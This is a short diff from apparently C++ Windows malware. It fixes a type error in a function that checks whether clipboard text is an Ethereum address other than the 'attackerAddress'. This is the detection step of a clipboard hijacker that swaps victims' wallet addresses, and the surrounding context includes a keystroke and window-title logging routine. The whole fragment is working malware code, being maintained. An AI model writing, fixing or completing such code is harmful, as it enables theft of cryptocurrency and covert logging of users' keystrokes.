@@ -75,8 +75,8 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile.close();
 }
 
-bool isEthAddress(std::wstring cbText, std::wstring attackerAddress){
-	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText, attackerAddress) != 0) {
+bool isEthAddress(std::wstring cbText, LPWSTR attackerAddress){
+	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42 && wcscmp(cbText.c_str(), attackerAddress) != 0) {
 		return TRUE;
 	}
 	return FALSE;
